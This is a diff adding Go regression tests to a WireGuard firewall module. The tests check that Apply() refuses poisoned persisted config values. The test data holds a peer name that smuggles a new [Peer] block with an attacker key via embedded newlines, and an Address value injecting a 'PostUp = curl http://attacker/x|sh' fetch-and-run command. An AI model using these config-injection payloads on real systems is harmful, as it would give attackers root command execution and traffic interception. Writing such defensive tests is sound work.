@@ -1,10 +1,34 @@
 package wireguard
 
 import (
+	"context"
 	"encoding/base64"
 	"strings"
 	"testing"
+
+	"github.com/giovanibalarini/linkguard-fw/internal/firewall"
 )
+
+// recExec is a firewall.Executor test double that records every write command
+// without touching the system, mirroring the recExec pattern already used in
+// internal/keaunbound and internal/updater tests. IsDryRun() returns false so
+// Apply() runs its real code path (validate → write → systemd) rather than
+// short-circuiting; the recorded commands let us prove systemd was never asked
+// to (re)start the interface.
+type recExec struct {
+	commands [][]string
+}
+
+func (e *recExec) Execute(_ context.Context, cmd string, args ...string) (string, error) {
+	e.commands = append(e.commands, append([]string{cmd}, args...))
+	return "", nil
+}
+
+func (e *recExec) ExecuteRead(_ context.Context, cmd string, args ...string) (string, error) {
+	return "", nil
+}
+
+func (e *recExec) IsDryRun() bool { return false }
 
 func TestGenerateKeypair(t *testing.T) {
 	priv, pub, err := GenerateKeypair()
@@ -157,5 +181,79 @@ func TestValidatePeerNameAcceptsAccentedName(t *testing.T) {
 func TestValidatePeerNameRejectsEmpty(t *testing.T) {
 	if err := ValidatePeerName(""); err == nil {
 		t.Fatal("expected error for empty name, got nil")
+	}
+}
+
+// TestApplyRejectsMaliciousPersistedPeerName is the sink-side (defense in
+// depth) regression test. It builds a Config with a poisoned Peer.Name directly
+// on the struct — simulating a name persisted in the secrets vault BEFORE
+// ingress validation existed, so it never passed through the validating HTTP
+// handlers. Apply() must refuse: return an error, never write wg0.conf, and
+// never ask systemd to (re)start the interface with the injected block.
+func TestApplyRejectsMaliciousPersistedPeerName(t *testing.T) {
+	exec := &recExec{}
+	svc := NewService(exec)
+
+	c := Defaults()
+	c.Enabled = true // would otherwise reach the enable/restart systemd path
+	c.PrivateKey = "SERVERPRIV"
+	// A legacy peer name carrying an embedded newline that closes the "# %s"
+	// comment and injects a brand-new [Peer] block wg-quick would apply as root.
+	c.Peers = []Peer{{
+		ID:        "legacy-1",
+		Name:      "Meu celular\n[Peer]\nPublicKey = attacker-key\nAllowedIPs = 0.0.0.0/0",
+		PublicKey: "PEERPUB",
+		AllowedIP: "10.7.0.2/32",
+	}}
+
+	out, err := svc.Apply(context.Background(), c)
+	if err == nil {
+		t.Fatalf("expected Apply() to reject the malicious persisted peer name, got nil error (out=%q)", out)
+	}
+	if len(exec.commands) != 0 {
+		t.Fatalf("expected no systemd commands to run when Apply() rejects a bad config, got %v", exec.commands)
+	}
+}
+
+// TestApplyAcceptsAllValidPersistedPeers proves the guard does not over-reach:
+// when the Address and every peer Name are valid, Apply() proceeds normally.
+// A dry-run executor short-circuits after validation (returning "dry-run")
+// without writing to /etc/wireguard, so this exercises the accept path without
+// needing root.
+func TestApplyAcceptsAllValidPersistedPeers(t *testing.T) {
+	svc := NewService(firewall.NewDryRunExecutor())
+
+	c := Defaults()
+	c.Enabled = true
+	c.PrivateKey = "SERVERPRIV"
+	c.Peers = []Peer{
+		{ID: "a", Name: "João - Notebook", PublicKey: "PUB1", AllowedIP: "10.7.0.2/32"},
+		{ID: "b", Name: "Phone", PublicKey: "PUB2", AllowedIP: "10.7.0.3/32"},
+	}
+
+	out, err := svc.Apply(context.Background(), c)
+	if err != nil {
+		t.Fatalf("expected Apply() to accept a config with all-valid peers, got: %v", err)
+	}
+	if out != "dry-run" {
+		t.Fatalf("expected dry-run short-circuit after validation, got %q", out)
+	}
+}
+
+// TestApplyRejectsMalformedPersistedAddress covers the other renderable server
+// field: a poisoned Address must also stop Apply() at the sink.
+func TestApplyRejectsMalformedPersistedAddress(t *testing.T) {
+	exec := &recExec{}
+	svc := NewService(exec)
+
+	c := Defaults()
+	c.Enabled = true
+	c.Address = "10.7.0.1/24\nPostUp = curl http://attacker/x|sh"
+
+	if _, err := svc.Apply(context.Background(), c); err == nil {
+		t.Fatal("expected Apply() to reject a malformed persisted Address, got nil")
+	}
+	if len(exec.commands) != 0 {
+		t.Fatalf("expected no systemd commands when Apply() rejects a bad Address, got %v", exec.commands)
 	}
 }
